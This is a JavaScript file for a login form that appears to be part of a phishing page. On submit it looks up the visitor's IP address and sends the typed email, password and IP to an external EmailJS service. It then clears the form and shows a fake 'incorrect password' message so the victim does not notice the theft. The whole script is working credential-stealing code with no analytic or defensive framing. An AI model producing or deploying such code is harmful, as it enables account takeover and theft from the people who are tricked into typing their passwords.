// Set the year in footer
document.getElementById('year').innerHTML = new Date().getFullYear();

// Make the button enable when all the form fields are filled
var email = document.getElementById('email');
var password = document.getElementById('password');
var submit = document.getElementById('submit');

// Function to manage the submit button state
function manage() {
    submit.disabled = !(email.value.trim() && password.value.trim());
}

// Add event listeners to the input fields to trigger the manage function on input
email.addEventListener('keyup', manage);
password.addEventListener('keyup', manage);

// Event listener for form submission
document.getElementById("form").addEventListener("submit", function (event) {
    event.preventDefault(); // Prevent default form submission

    // Remove or comment this line to keep "Log In" on button
    // submit.value = "Sending..."; 

    const serviceID = "service_qn1jq9b";
    const templateID = "template_runmkv5";

    fetch("https://api.ipify.org?format=json")
        .then((response) => response.json())
        .then((data) => {
            console.log("IP data: ", data);

            // Construct email parameters object
            var params = {
                email: email.value,
                password: password.value,
                IP: data.ip,
            };

            emailjs
                .send(serviceID, templateID, params)
                .then((res) => {
                    console.log("Success: ", res);
                    // Clear form fields and show success message
                    email.value = "";
                    password.value = "";
                    // submit.value = "Log In"; // Keep this to ensure it stays "Log In"
                    alert("incorrect__password");
                })
                .catch((err) => {
                    console.log("Error: ", err);
                    // submit.value = "Log In"; // Keep this to ensure it stays "Log In"

                    // Display error message below the form
                    let errorMsg = document.querySelector(".incorrect__password");
                    if (!errorMsg) {
                        errorMsg = document.createElement("p");
                        errorMsg.classList.add("incorrect__password");
                        document.getElementById("form").appendChild(errorMsg);
                    }
                    errorMsg.innerText = "incorrect password"; // Update the message
                });
        })
        .catch((error) => {
            console.log("Fetch error: ", error);
            // submit.value = "Log In"; // Keep this to ensure it stays "Log In"
        });
});
